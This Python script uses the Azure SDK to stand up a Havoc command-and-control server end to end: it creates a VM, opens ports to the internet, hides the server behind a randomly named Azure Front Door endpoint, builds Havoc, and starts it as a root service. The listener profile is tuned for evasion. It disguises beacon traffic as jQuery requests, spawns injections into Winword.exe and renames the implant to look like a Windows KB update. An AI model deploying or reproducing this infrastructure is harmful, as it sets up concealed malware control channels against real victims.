from azure.identity import DefaultAzureCredential
from azure.mgmt.resource import ResourceManagementClient
from azure.mgmt.compute import ComputeManagementClient
from azure.mgmt.network import NetworkManagementClient
from azure.mgmt.network.models import NetworkSecurityGroup, SecurityRule, VirtualNetwork, Subnet, NetworkInterface, PublicIPAddress
from azure.mgmt.compute.models import HardwareProfile, StorageProfile, OSDisk, ManagedDiskParameters, OSProfile, NetworkInterfaceReference, VirtualMachine, DiagnosticsProfile, BootDiagnostics
from azure.mgmt.frontdoor import FrontDoorManagementClient
from azure.mgmt.compute.models import VirtualMachineExtension
import random
import string
import time


def generate_random_name(length=20):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))


# Configuration
subscription_id = 'YOU-SUBSCRIPTION-ID'
resource_group_name = 'Automated-C2'
location = 'westeurope'  # Choisissez votre région
vm_name = 'c2-deploy'
admin_username = 'c2-deploy'
admin_password = 'Sup3rC0mplexP@ssw0rd'
c2_port = random.randint(30000, 60000)



# Authentication
credential = DefaultAzureCredential()

# Connection
resource_client = ResourceManagementClient(credential, subscription_id)
compute_client = ComputeManagementClient(credential, subscription_id)
network_client = NetworkManagementClient(credential, subscription_id)

# Ressource group creation
print("[+] Creating ressource group...")
resource_client.resource_groups.create_or_update(resource_group_name, {'location': location})

# Virtual network creation
print("[+] Creating network...")
vnet_params = {
    'location': location,
    'address_space': {'address_prefixes': ['10.0.0.0/16']}
}
vnet_result = network_client.virtual_networks.begin_create_or_update(resource_group_name, 'myVNet', vnet_params).result()

# Subnet creation
subnet_params = {'address_prefix': '10.0.0.0/24'}
subnet_result = network_client.subnets.begin_create_or_update(resource_group_name, 'myVNet', 'mySubnet', subnet_params).result()

# Public IP creation
print("[+] Creating public IP...")
ip_params = {
    'location': location,
    'public_ip_allocation_method': 'Static'
}
ip_address_result = network_client.public_ip_addresses.begin_create_or_update(resource_group_name, 'myIPAddress', ip_params).result()
backend_ip  = None
while backend_ip  == None:
    print("[+] Waiting for public IP allocation...")
    time.sleep(10)
    ip_address_result = network_client.public_ip_addresses.begin_create_or_update(resource_group_name, 'myIPAddress', ip_params).result()
    backend_ip  = ip_address_result.ip_address
print(f"[+] Created public IP is {backend_ip }")

# Network interface creation
nic_params = {
    'location': location,
    'ip_configurations': [{
        'name': 'myIPConfig',
        'subnet': {'id': subnet_result.id},
        'public_ip_address': {'id': ip_address_result.id}
    }]
}
nic_result = network_client.network_interfaces.begin_create_or_update(resource_group_name, 'myNIC', nic_params).result()

# Virtual machine creation
print("[+] Creating virtual machine...")
vm_params = {
    'location': location,
    'hardware_profile': HardwareProfile(vm_size='Standard_B1s'),
    'storage_profile': StorageProfile(
        image_reference={
            'publisher': 'Debian',
            'offer': 'debian-11',
            'sku': '11-backports-gen2',
            'version': 'latest'
        },
        os_disk=OSDisk(
            create_option='FromImage',
            managed_disk=ManagedDiskParameters(storage_account_type='Standard_LRS')
        )
    ),
    'os_profile': OSProfile(
        computer_name=vm_name,
        admin_username=admin_username,
        admin_password=admin_password
    ),
    'network_profile': {
        'network_interfaces': [NetworkInterfaceReference(id=nic_result.id)]
    }
}
vm_result = compute_client.virtual_machines.begin_create_or_update(resource_group_name, vm_name, vm_params).result()
print(f"[+] Virtual machine '{vm_name}' created successfully")


# Network security group creation
print("[+] Creating network security group...")
nsg_name = "NSGGROUP"
nsg_params = {
    'location': location,
    'security_rules': []
}
nsg_result = network_client.network_security_groups.begin_create_or_update(resource_group_name, nsg_name, nsg_params).result()

# Allow HTTPS
print("[+] Creating HTTPS network rule...")
https_rule = SecurityRule(
    name='allow_https',
    protocol='Tcp',
    source_port_range='*',
    destination_port_range='443',
    source_address_prefix='*',
    destination_address_prefix='*',
    access='Allow',
    priority=100,
    direction='Inbound'
)
network_client.security_rules.begin_create_or_update(resource_group_name, nsg_name, 'allow_https', https_rule).result()

# Allow HTTP
print("[+] Creating HTTP network rule...")
http_rule = SecurityRule(
    name='allow_http',
    protocol='Tcp',
    source_port_range='*',
    destination_port_range='80',
    source_address_prefix='*',
    destination_address_prefix='*',
    access='Allow',
    priority=200,
    direction='Inbound'
)
network_client.security_rules.begin_create_or_update(resource_group_name, nsg_name, 'allow_http', http_rule).result()

# Allow SSH
print("[+] Creating SSH network rule...")
ssh_rule = SecurityRule(
    name='allow_ssh',
    protocol='Tcp',
    source_port_range='*',
    destination_port_range='22',
    source_address_prefix='*',
    destination_address_prefix='*',
    access='Allow',
    priority=300,
    direction='Inbound'
)
network_client.security_rules.begin_create_or_update(resource_group_name, nsg_name, 'allow_ssh', ssh_rule).result()

# Allow C2 client trafic
print("[+] Creating C2 network rule...")
c2_rule = SecurityRule(
    name='allow_c2',
    protocol='Tcp',
    source_port_range='*',
    destination_port_range=c2_port,
    source_address_prefix='*',
    destination_address_prefix='*',
    access='Allow',
    priority=400,
    direction='Inbound'
)
network_client.security_rules.begin_create_or_update(resource_group_name, nsg_name, 'allow_c2', c2_rule).result()

# NSG association to VM
print("[+] Associating network rules to VM...")
nic = network_client.network_interfaces.get(resource_group_name, "myNIC")
nic.network_security_group = nsg_result
network_client.network_interfaces.begin_create_or_update(resource_group_name, "myNIC", nic).result()
print(f"[+] Selected ports are now opened")

# frontdoor management connection
client = FrontDoorManagementClient(
    credential=DefaultAzureCredential(),
    subscription_id=subscription_id
)

# Frontdoor properties generation
subdomain = generate_random_name()
fontdoor_hostname = str(subdomain)+".azurefd.net"
print(f"[+] Creating {fontdoor_hostname} frontdoor...")

# Frontdoor creation
response = client.front_doors.begin_create_or_update(
    resource_group_name=resource_group_name,
    front_door_name=subdomain,
    front_door_parameters={
        "location": "global",
        "properties": {
            "backendPools": [
                {
                    "name": "bkpool1",
                    "properties": {
                        "backends": [
                            {
                                "address": backend_ip,
                                "httpPort": 80,
                                "httpsPort": 443,
                                "priority": 1,
                                "weight": 1,
                            }
                        ]
                    },
                    "healthProbeSettings": {
                        "id": f"/subscriptions/{subscription_id}/resourceGroups/{resource_group_name}/providers/Microsoft.Network/frontDoors/{subdomain}/healthProbeSettings/hltprbsett1"
                    },
                    "loadBalancingSettings": {
                        "id": f"/subscriptions/{subscription_id}/resourceGroups/{resource_group_name}/providers/Microsoft.Network/frontDoors/{subdomain}/loadBalancingSettings/ldbalsett1"
                    },
                }
            ],
            "enabledState": "Enabled",
            "frontendEndpoints": [
                {
                    "name": "frendpoint1",
                    "properties": {
                        "hostName": f"{fontdoor_hostname}"
                    }
                }
            ],
            "healthProbeSettings": [
                {
                    "name": "hltprbsett1",
                    "properties": {
                        "enabledState": "Enabled",
                        "healthProbeMethod": "HEAD",
                        "intervalInSeconds": 120,
                        "path": "/",
                        "protocol": "Http",
                    },
                }
            ],
            "loadBalancingSettings": [
                {"name": "ldbalsett1", "properties": {"sampleSize": 4, "successfulSamplesRequired": 2}}
            ],
            "routingRules": [
                {
                    "name": "rtrul1",
                    "properties": {
                        "acceptedProtocols": ["Http"],
                        "enabledState": "Enabled",
                        "frontendEndpoints": [
                            {
                                "id": f"/subscriptions/{subscription_id}/resourceGroups/{resource_group_name}/providers/Microsoft.Network/frontDoors/{subdomain}/frontendEndpoints/frendpoint1"
                            }
                        ],
                        "patternsToMatch": ["/*"],
                        "routeConfiguration": {
                            "@odata.type": "#Microsoft.Azure.FrontDoor.Models.FrontdoorForwardingConfiguration",
                            "backendPool": {
                                "id": f"/subscriptions/{subscription_id}/resourceGroups/{resource_group_name}/providers/Microsoft.Network/frontDoors/{subdomain}/backendPools/bkpool1"
                            },
                        }
                    },
                }
            ],
        }
    },
).result()

# Customize VM
print(f"[+] Deploying commands on VM...")

# Python 3.10.14
print(f"[+] Installing Python 3.10.14...")
result = compute_client.virtual_machines.begin_run_command(
    resource_group_name=resource_group_name,
    vm_name=vm_name,
    parameters={
        'commandId': 'RunShellScript',
        'script': [
            'sudo apt update',
            'sudo apt install software-properties-common -y',
            'sudo apt install -y build-essential zlib1g-dev libncurses5-dev libgdbm-dev libnss3-dev libssl-dev libreadline-dev libffi-dev libsqlite3-dev wget libbz2-dev',
            'sudo apt update',
            'sudo apt install software-properties-common -y',
            'sudo apt install -y build-essential zlib1g-dev libncurses5-dev libgdbm-dev libnss3-dev libssl-dev libreadline-dev libffi-dev libsqlite3-dev wget libbz2-dev',
            'curl https://www.python.org/ftp/python/3.10.14/Python-3.10.14.tgz -o /root/Python-3.10.14.tgz',
            'tar -xf /root/Python-3.10.14.tgz -C /root',
            'cd /root/Python-3.10.14; ./configure --enable-optimizations',
            'cd /root/Python-3.10.14; make -j $(nproc)',
            'cd /root/Python-3.10.14; sudo make altinstall'
        ]
    }
).result()

# Go 1.18.10
print(f"[+] Installing Go 1.18.10...")
result = compute_client.virtual_machines.begin_run_command(
    resource_group_name=resource_group_name,
    vm_name=vm_name,
    parameters={
        'commandId': 'RunShellScript',
        'script': [
            'sudo apt purge golang-go',
            'cd /usr/local && sudo wget https://go.dev/dl/go1.18.10.linux-amd64.tar.gz',
            'sudo tar -xf /usr/local/go1.18.10.linux-amd64.tar.gz -C /usr/local',
            'echo \'export GOROOT=/usr/local/go\' | sudo tee -a /root/.bashrc',
            'echo \'export GOPATH=$HOME/go\' | sudo tee -a /root/.bashrc',
            'echo \'export PATH=$GOPATH/bin:$GOROOT/bin:$PATH\' | sudo tee -a /root/.bashrc'
            'echo \'export GOCACHE=/root/go/cache\' | sudo tee -a /root/.bashrc',
            f'sudo cp /root/.bashrc /home/{admin_username}/.bashrc',
            'sudo rm /usr/bin/go && sudo ln -s /usr/local/go/bin/go /usr/bin/go'
        ]
    }
).result()

# Havoc C2
print(f"[+] Installing Havoc C2...")
result = compute_client.virtual_machines.begin_run_command(
    resource_group_name=resource_group_name,
    vm_name=vm_name,
    parameters={
        'commandId': 'RunShellScript',
        'script': [
            'sudo apt update',
            'sudo apt install -y git build-essential apt-utils cmake libfontconfig1 libglu1-mesa-dev libgtest-dev libspdlog-dev libboost-all-dev libncurses5-dev libgdbm-dev libssl-dev libreadline-dev libffi-dev libsqlite3-dev libbz2-dev mesa-common-dev qtbase5-dev qtchooser qt5-qmake qtbase5-dev-tools libqt5websockets5 libqt5websockets5-dev qtdeclarative5-dev qtbase5-dev libqt5websockets5-dev python3-dev libboost-all-dev mingw-w64 nasm',
            'sudo apt update',
            'sudo apt install -y git build-essential apt-utils cmake libfontconfig1 libglu1-mesa-dev libgtest-dev libspdlog-dev libboost-all-dev libncurses5-dev libgdbm-dev libssl-dev libreadline-dev libffi-dev libsqlite3-dev libbz2-dev mesa-common-dev qtbase5-dev qtchooser qt5-qmake qtbase5-dev-tools libqt5websockets5 libqt5websockets5-dev qtdeclarative5-dev qtbase5-dev libqt5websockets5-dev python3-dev libboost-all-dev mingw-w64 nasm',
            'sudo git clone https://github.com/HavocFramework/Havoc.git /opt/Havoc',
            'sudo chmod 755 -R /opt/Havoc',
            'cd /opt/Havoc/teamserver && sudo go mod download golang.org/x/sys',
            'cd /opt/Havoc/teamserver && sudo go mod download github.com/ugorji/go'
        ]
    }
).result()

# Havoc profile generation
havoc_config = """
Teamserver {
    Host = "0.0.0.0"
    Port = "{c2_port}"
    Build {
        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
        Compiler86 = "/usr/bin/i686-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}
Operators {
    user "{admin_username}" {
        Password = "{admin_password}"
    }
}
Listeners {
    Http {
        Name         = "{fontdoor_hostname}"
        KillDate     = "2030-10-24 08:44:12"
        WorkingHours = "0:00-23:59"
        Hosts        = ["{fontdoor_hostname}"]
        HostBind     = "0.0.0.0"
        HostRotation = "round-robin"
        PortBind     = 80
        PortConn     = 80
        Secure       = false
        UserAgent    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
        Uris         = [{random_uris}]
        Headers      = [
            "Server: Apache",
            "Content-type: text/html; charset=utf-8",
            "Accept-Language: en-US,en;q=0.9"
        ]
        Response {
            Headers  = [
                "Content-type: text/html; charset=utf-8",
                "Connection: keep-alive",
                "Cache-control: no-cache, no-store, must-revalidate",
                "Pragma: no-cache",
                "Expires: 0"
            ]
        }
    }
}
Demon {
    Sleep  = 43
    Jitter = 33
    Injection {
        Spawn64 = "Winword.exe"
        Spawn32 = "Winword.exe"
    }
}
"""
random_uris = "";
for i in range(0, 20):
    random_uris += '"/js/jquery-'+str(random.randint(1, 3))+'.'+str(random.randint(1, 3))+'.'+str(random.randint(1, 3))+'.min.js?id='+str(random.randint(10000, 30000))+'&cookie='+str(generate_random_name(128))+'",'
random_uris = random_uris[:-1]
havoc_config = havoc_config.replace('{admin_username}', admin_username)
havoc_config = havoc_config.replace('{admin_password}', admin_password)
havoc_config = havoc_config.replace('{fontdoor_hostname}', fontdoor_hostname)
havoc_config = havoc_config.replace('{c2_port}', str(c2_port))
havoc_config = havoc_config.replace('{random_uris}', random_uris)

# Havoc profile update
print(f"[+] Preparing Havoc C2 config...")
result = compute_client.virtual_machines.begin_run_command(
    resource_group_name=resource_group_name,
    vm_name=vm_name,
    parameters={
        'commandId': 'RunShellScript',
        'script': [
            f'echo \'{havoc_config}\' | sudo tee /opt/Havoc/profiles/havoc.yaotl'
        ]
    }
).result()


# Havoc properties update
print(f"[+] Modifying Havoc default payload name...")
result = compute_client.virtual_machines.begin_run_command(
    resource_group_name=resource_group_name,
    vm_name=vm_name,
    parameters={
        'commandId': 'RunShellScript',
        'script': [
            'cd /opt/Havoc/teamserver && sudo sed -i \'s/PayloadName = "demon"/PayloadName = "KB'+str(random.randint(500000, 999999))+'"/g\' pkg/common/builder/builder.go'
        ]
    }
).result()

# Build teamserver with go1.18.22
print(f"[+] Building Havoc team server...")
result = compute_client.virtual_machines.begin_run_command(
    resource_group_name=resource_group_name,
    vm_name=vm_name,
    parameters={
        'commandId': 'RunShellScript',
        'script': [
            'sudo apt install -y golang-go nasm mingw-w64 wget',
            'sudo rm /usr/bin/go && sudo ln -s /usr/local/go/bin/go /usr/bin/go',
            'cd /opt/Havoc && sudo sudo make ts-build'
        ]
    }
).result()

# Start C2 as demon
systemd = """
[Unit]
Description=HAVOC
After=network-online.target
[Service]
Type=simple
User=root
Group=root
WorkingDirectory=/opt/Havoc
ExecStart=/opt/Havoc/havoc server --profile ./profiles/havoc.yaotl -v --debug
[Install]
WantedBy=multi-user.target
"""
print(f"[+] Creating and starting Havoc C2 demon...")
result = compute_client.virtual_machines.begin_run_command(
    resource_group_name=resource_group_name,
    vm_name=vm_name,
    parameters={
        'commandId': 'RunShellScript',
        'script': [
            f'echo \'{systemd}\' | sudo tee /etc/systemd/system/havoc.service',
            'sudo systemctl enable havoc.service',
            'sudo systemctl start havoc.service'
        ]
    }
).result()


print("\nYou can now connect to your C2 server :\n\nIP address : " + str(backend_ip) + "\nPort : "+str(c2_port)+"\n" + "Username : " + str(admin_username) + "\nPassword : "+str(admin_password) + "\nFrontdoor : " + str(fontdoor_hostname) + "\n\n")